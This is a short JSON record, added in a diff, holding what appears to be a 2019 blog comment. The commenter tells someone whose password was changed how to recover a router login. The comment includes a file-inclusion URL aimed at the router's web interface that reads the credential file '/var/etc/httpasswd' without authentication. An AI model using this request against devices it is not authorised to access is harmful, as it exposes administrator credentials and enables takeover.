@@ -1,0 +1,8 @@
+{
+  "id": "3340",
+  "author": "keithrozario",
+  "email_hash": "182487cdd4511fc77682df12c6404f6f",
+  "url": null,
+  "date": "2019-08-27 12:00:24",
+  "content": "looks like someone changed your password. Try this:\n\nhttp://192.168.0.1/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd\n\nThe username/password should be visible in the left hand side of the screen.\n\nKeith"
+}
